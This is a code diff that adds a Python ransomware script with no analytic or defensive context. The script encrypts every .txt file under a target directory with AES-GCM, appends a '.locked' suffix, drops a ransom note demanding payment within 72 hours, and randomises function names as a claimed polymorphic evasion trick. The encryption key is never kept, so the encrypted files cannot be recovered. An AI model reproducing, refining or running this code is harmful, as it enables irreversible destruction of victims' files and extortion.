@@ -1,0 +1,63 @@
+import sys
+import random
+import string
+from pathlib import Path
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+def random_label(length=8):
+    return ''.join(random.choices(string.ascii_lowercase, k=length))
+
+# Polymorphic: Randomize function names at runtime
+func_create_key = random_label()
+func_lock_file = random_label()
+func_write_ransom = random_label()
+func_execute = random_label()
+
+def _create_encryption_key():
+    key = AESGCM.generate_key(bit_length=256)
+    aes = AESGCM(key)
+    nonce = os.urandom(12)
+    return aes,nonce
+
+def _lock_file(text):
+    locked_path = text.with_suffix(text.suffix + ".locked")
+    text.rename(locked_path)
+
+def _write_ransom_message(target_path):
+    # Randomize ransom note filename
+    ransom_note_path = target_path / (random_label(6) + "_NOTE.txt")
+    ransom_note = (
+        "All your important files have been encrypted.",
+        "Do not attempt to rename, modify, or decrypt the files yourself, as this may result in permanent data loss.",
+        "To recover your files:",
+        "1. Do not shut down or restart your computer.",
+        "2. Contact us at: [ransom_email@example.com] with your unique ID: [ID]",
+        "3. You will receive payment instructions and a decryption tool.",
+        "You have 72 hours to comply. Failure to pay within this timeframe may result in your files being permanently inaccessible.",
+        "Do not attempt to use third-party recovery tools. Only our decryption tool can restore your files.",
+        "We guarantee that after payment, you will receive full access to your data.",
+        "This is not a joke."
+    )
+    ransom_note_path.write_text("\n".join(ransom_note))
+
+def _execute_ransomware(target_path: Path):
+    aes, nonce = globals()[func_create_key]()
+    for text in target_path.rglob("*.txt"):
+        buffer = text.read_bytes()
+        ciphertext = aes.encrypt(nonce, buffer, None)
+        text.write_bytes(ciphertext)
+        globals()[func_lock_file](text)
+
+globals()[func_create_key] = _create_encryption_key
+globals()[func_lock_file] = _lock_file
+globals()[func_write_ransom] = _write_ransom_message
+globals()[func_execute] = _execute_ransomware
+
+if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print(f"Usage: python {sys.argv[0]} <target_directory>")
+        sys.exit(1)
+    target_directory = Path(sys.argv[1])
+    target_directory.mkdir(parents=True, exist_ok=True)
+    globals()[func_execute](target_directory)
+    globals()[func_write_ransom](target_directory)
